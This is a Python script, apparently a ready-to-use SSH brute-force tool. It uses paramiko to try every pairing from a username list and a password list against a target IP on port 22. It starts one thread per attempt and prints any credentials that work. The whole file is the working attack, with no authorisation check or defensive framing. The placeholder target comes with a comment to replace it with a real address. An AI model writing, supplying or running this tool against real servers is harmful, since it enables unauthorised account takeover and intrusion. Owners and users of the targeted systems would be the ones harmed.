import paramiko
import socket
import sys
from threading import Thread, Lock

# Load username and password lists
username_file = "usernames.txt"
password_file = "passwords.txt"

target_ip = "127.0.0.1"  # Replace with the target's IP address
ssh_port = 22  # SSH port (usually 22)

# Global lock for thread safety when printing
lock = Lock()

# Function to attempt SSH login with a specific username and password
def ssh_connect(username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(target_ip, port=ssh_port, username=username, password=password, timeout=3)
        with lock:
            print(f"[+] Found credentials - Username: {username} | Password: {password}")
        ssh_client.close()
    except paramiko.AuthenticationException:
        # Authentication failed
        pass
    except socket.error as e:
        with lock:
            print(f"[-] Connection error: {e}")
    finally:
        ssh_client.close()

# Main function to read username and password lists and start threads
def main():
    try:
        with open(username_file, "r") as user_file:
            usernames = user_file.read().splitlines()
        with open(password_file, "r") as pass_file:
            passwords = pass_file.read().splitlines()
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        sys.exit(1)

    print("[*] Starting SSH brute force attack...")
    
    # Start a thread for each username/password pair
    for username in usernames:
        for password in passwords:
            thread = Thread(target=ssh_connect, args=(username, password))
            thread.start()

# Run the main function
if __name__ == "__main__":
    main()
